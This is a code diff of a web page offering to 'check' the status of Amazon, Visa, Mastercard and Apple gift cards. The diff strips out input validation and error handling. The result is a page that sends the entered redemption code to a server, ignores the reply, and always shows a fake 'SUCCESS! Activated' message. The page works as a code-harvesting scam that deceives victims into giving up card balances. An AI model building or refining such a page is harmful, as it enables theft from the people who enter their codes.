@@ -8,7 +8,7 @@
 <style>
 body {
   margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
+  font-family: Arial;
   background: #f1f5f9;
 }
 
@@ -32,11 +32,6 @@ body {
   box-shadow: 0 10px 30px rgba(0,0,0,0.1);
 }
 
-.logo {
-  text-align: center;
-  margin-bottom: 10px;
-}
-
 input, select {
   width: 100%;
   padding: 12px;
@@ -56,9 +51,6 @@ button {
   font-weight: bold;
 }
 
-.step { display: none; text-align: center; }
-.step.active { display: block; }
-
 .loader {
   border: 4px solid #e2e8f0;
   border-top: 4px solid #4f46e5;
@@ -69,11 +61,62 @@ button {
   animation: spin 1s linear infinite;
 }
 
-.success { color: green; }
-.error { color: red; }
+.step { display: none; text-align: center; }
+.step.active { display: block; }
 
 @keyframes spin {
   100% { transform: rotate(360deg); }
+}
+
+/* MODAL */
+.modal {
+  display:none;
+  position:fixed;
+  top:0; left:0;
+  width:100%; height:100%;
+  background:rgba(0,0,0,0.5);
+  justify-content:center;
+  align-items:center;
+}
+
+.modal-box {
+  background:white;
+  padding:25px;
+  border-radius:15px;
+  width:90%;
+  max-width:350px;
+  text-align:center;
+}
+
+.success-icon {
+  width:60px;
+  height:60px;
+  background:#6d28d9;
+  border-radius:50%;
+  margin:0 auto 15px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:white;
+  font-size:28px;
+}
+
+.info-box {
+  text-align:left;
+  background:#f1f5f9;
+  padding:10px;
+  border-radius:10px;
+  margin-top:15px;
+}
+
+.close-btn {
+  margin-top:20px;
+  background:#ef4444;
+  color:white;
+  border:none;
+  padding:12px;
+  width:100%;
+  border-radius:10px;
 }
 </style>
 </head>
@@ -87,14 +130,11 @@ button {
 
 <!-- STEP 1 -->
 <div class="container step active" id="step1">
-
-  <div id="cardLogo" class="logo"></div>
-
-  <h1>Check Card Status</h1>
+  <h2>Check Card Status</h2>
 
   <label>Card Type</label>
-  <select id="cardType" onchange="updateUI()">
-    <option value="generic">Gift Card</option>
+  <select id="cardType">
+    <option value="amazon">Amazon</option>
     <option value="visa">Visa</option>
     <option value="mastercard">Mastercard</option>
     <option value="apple">Apple</option>
@@ -103,22 +143,15 @@ button {
   <label>Currency</label>
   <select>
     <option>USD</option>
-    <option>EUR</option>
-    <option>GBP</option>
   </select>
 
   <label>Card Amount</label>
-  <input id="amount" placeholder="e.g. 100">
+  <input id="amount" placeholder="e.g. 200">
 
   <label>Redemption Code</label>
-  <input id="code"
-    placeholder="Enter code"
-    oninput="this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'')">
+  <input id="code" placeholder="Enter code">
 
   <button onclick="goToVerify()">Check Status</button>
-
-  <div id="errorMsg" class="error"></div>
-
 </div>
 
 <!-- STEP 2 -->
@@ -127,86 +160,70 @@ button {
   <div class="loader"></div>
 </div>
 
-<!-- STEP 3 -->
-<div class="container step" id="step3">
-  <h2 id="resultTitle"></h2>
-  <p id="resultText"></p>
-  <button onclick="reset()">Try Again</button>
+<!-- MODAL -->
+<div class="modal" id="modal">
+  <div class="modal-box">
+
+    <div class="success-icon">✔</div>
+
+    <h2>SUCCESS!</h2>
+    <p id="message"></p>
+
+    <div class="info-box">
+      <p><b>Card Type</b> <span id="mType" style="float:right;"></span></p>
+      <p><b>Amount</b> <span id="mAmount" style="float:right;"></span></p>
+      <p><b>Status</b> <span style="float:right;color:green;">Activated</span></p>
+    </div>
+
+    <button class="close-btn" onclick="closeModal()">Close</button>
+
+  </div>
 </div>
 
 <script>
-// Apple logo
-const appleLogo = `
-<svg viewBox="0 0 24 24" width="40" height="40" fill="black" style="display:block;margin:auto;">
-  <path d="M16.365 1.43c0 1.14-.463 2.24-1.21 3.02-.79.83-2.07 1.47-3.2 1.39-.14-1.08.42-2.23 1.18-3.01.83-.86 2.22-1.48 3.23-1.4zM20.5 17.08c-.37.84-.82 1.62-1.34 2.33-.71.97-1.29 1.64-1.75 2.01-.71.61-1.47.92-2.29.95-.59 0-1.3-.17-2.13-.52-.84-.35-1.61-.52-2.32-.52-.74 0-1.53.17-2.36.52-.83.35-1.5.54-2.02.56-.79.03-1.56-.3-2.3-.99-.47-.4-1.08-1.1-1.82-2.1-.79-1.06-1.44-2.3-1.96-3.73-.56-1.54-.84-3.03-.84-4.47 0-1.65.36-3.07 1.07-4.26.56-.96 1.31-1.72 2.24-2.27.93-.55 1.93-.83 3-.85.63 0 1.45.2 2.47.6 1.01.4 1.66.6 1.95.6.21 0 .91-.22 2.09-.66 1.12-.41 2.07-.58 2.85-.52 2.12.17 3.72 1.01 4.78 2.51-1.9 1.15-2.84 2.76-2.82 4.82.02 1.61.6 2.95 1.74 4.02.52.5 1.1.88 1.75 1.14-.14.4-.29.79-.46 1.16z"/>
-</svg>
-`;
 
-function updateUI() {
-  const type = document.getElementById("cardType").value;
-  const logo = document.getElementById("cardLogo");
-
-  if (type === "apple") {
-    logo.innerHTML = appleLogo;
-  } else {
-    logo.innerHTML = "";
-  }
+function getMessage(type){
+  if(type==="amazon") return "Your Amazon card has been successfully verified.";
+  if(type==="visa") return "Your Visa card has been successfully verified.";
+  if(type==="mastercard") return "Your Mastercard has been successfully verified.";
+  if(type==="apple") return "Your Apple card has been successfully verified.";
+  return "Your card has been successfully verified.";
 }
 
-function validateCode(code, type) {
-  // make Apple behave like others
-  if (type === "apple") return /^[A-Z0-9]{4,}$/.test(code);
-  if (type === "visa") return /^[A-Z0-9]{12,16}$/.test(code);
-  if (type === "mastercard") return /^[A-Z0-9]{10,16}$/.test(code);
-
-  return /^[A-Z0-9]{4,}$/.test(code);
-}
-
-async function goToVerify() {
-  const code = document.getElementById("code").value;
-  const type = document.getElementById("cardType").value;
-  const error = document.getElementById("errorMsg");
-
-  if (!validateCode(code, type)) {
-    error.textContent = "Invalid code format";
-    return;
-  }
-
-  error.textContent = "";
-  showStep("step2");
-
-  try {
-    const res = await fetch("/api/verify", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code })
-    });
-
-    const data = await res.json();
-
-    showStep("step3");
-
-  resultTitle.textContent = "Valid Code";
-resultTitle.className = "success";
-resultText.textContent = type.toUpperCase() + " card verified";
-
-  } catch (err) {
-    showStep("step3");
-    resultTitle.textContent = "Error";
-    resultText.textContent = "Request failed";
-  }
-}
-
-function showStep(id) {
-  document.querySelectorAll(".step").forEach(s => s.classList.remove("active"));
+function showStep(id){
+  document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
   document.getElementById(id).classList.add("active");
 }
 
-function reset() {
-  document.getElementById("code").value = "";
-  document.getElementById("amount").value = "";
+async function goToVerify(){
+  const type = document.getElementById("cardType").value;
+  const amount = document.getElementById("amount").value || "200";
+  const code = document.getElementById("code").value;
+
+  showStep("step2");
+
+  try {
+    await fetch("/api/verify", {
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body: JSON.stringify({ code })
+    });
+  } catch(e){}
+
+  setTimeout(()=>{
+    document.getElementById("message").textContent = getMessage(type);
+    document.getElementById("mType").textContent = type.toUpperCase();
+    document.getElementById("mAmount").textContent = "USD" + amount;
+
+    document.getElementById("modal").style.display="flex";
+  },1500);
+}
+
+function closeModal(){
+  document.getElementById("modal").style.display="none";
   showStep("step1");
 }
+
 </script>
 
 </body>
